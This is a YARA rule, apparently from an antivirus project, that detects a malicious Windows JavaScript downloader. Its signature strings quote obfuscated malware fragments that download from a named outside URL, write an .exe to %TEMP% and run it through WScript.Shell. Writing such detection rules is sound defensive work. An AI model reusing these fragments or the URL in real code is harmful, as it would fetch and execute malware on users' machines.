rule sig_20160330_aef415f8e526714894ae429e63b2674d {
  meta:
    description = "datamaliciousorder - file 20160330_aef415f8e526714894ae429e63b2674d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8e25c4f9e5e5777a4824dc86924dbaeb99421cc2b5fae17c3e58dd43c4ded895"

  strings:
    $s1  = "function _UW(_O0, _XJ){_CT = _CT * 1; return _O0 - _XJ;};" fullword ascii
    $s2  = "var _WW = function _P() {return WScript[_CO](\"WScript\"+\".Shell\");}(), _N = 11;" fullword ascii
    $s3  = "_ZA[_VH](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s4  = "if (_ZA[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _A(){return _ZB + \"\";};" fullword ascii
    $s6  = "function _KV() {return _WW[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DHMnuH8SIE5ks.ex\" + \"e\";};" fullword ascii
    $s7  = "function _OF(_F){_WW[\"Run\"](_F, _CT, _CT);};" fullword ascii
    $s8  = "function _ZQ() {return ((_U == true) && (_U == _FF)) ? 1 : _CT;};" fullword ascii
    $s9  = "function _S(){return 22;};" fullword ascii
    $s10 = "var _C = new this[\"Date\"]();" fullword ascii
    $s11 = "function _PG()" fullword ascii
    $s12 = "function _KW(){return _CO;};" fullword ascii
    $s13 = "function _X(_P0) {var _YW = (1, 2, 3, 4, 5, _P0); return _YW;};" fullword ascii
    $s14 = "return _UW(_TG, _I);" fullword ascii
    $s15 = " while (_H0){" fullword ascii
    $s16 = "var _U = false;" fullword ascii
    $s17 = "_U = true; " fullword ascii
    $s18 = "var _FF = false;" fullword ascii
    $s19 = "var _SB = false;" fullword ascii
    $s20 = "_FF = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}